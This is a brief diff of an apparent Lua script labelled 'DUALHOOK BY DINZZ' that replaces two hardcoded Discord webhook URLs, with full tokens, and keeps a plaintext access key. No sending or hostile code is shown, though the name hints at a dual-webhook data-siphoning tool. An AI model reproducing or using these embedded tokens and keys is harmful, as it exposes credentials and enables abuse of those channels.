@@ -1,8 +1,8 @@
 -- DUALHOOK BY DINZZ --
 
 -- URL Webhook Discord
-local webhook_url1 = "https://discord.com/api/webhooks/1325053300139233290/X54RZWcMnt0h980IQPYKo7KYY60K8ZqPso3MCyVkvs_7Sr_1SvS11nHpD_MdppI9J1nf"
-local webhook_url2 = "https://discord.com/api/webhooks/1324996384369414155/LBWNNFQc6yOl4c3kEO0q1o_MEOsaid28teEYDhtTEekGGHZXv1nuj9nWfy1Vxl2TXIYa"
+local webhook_url1 = "https://discord.com/api/webhooks/1325444740241559609/RPzaWK9VJG7adUC3nszG_oAjkqowruGyYRLYQx2Mp6BWucKbQ4-xyiad0WCA15fkW98S"
+local webhook_url2 = "https://discord.com/api/webhooks/1325418716690644992/45rMJyVc3WnHcw4tW1Q85LmH6J2lj5Sc0DgVuRD46ar-JkmFyLTJZURi-gc4jeZcKecC"
 
 -- Key yang benar
 local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
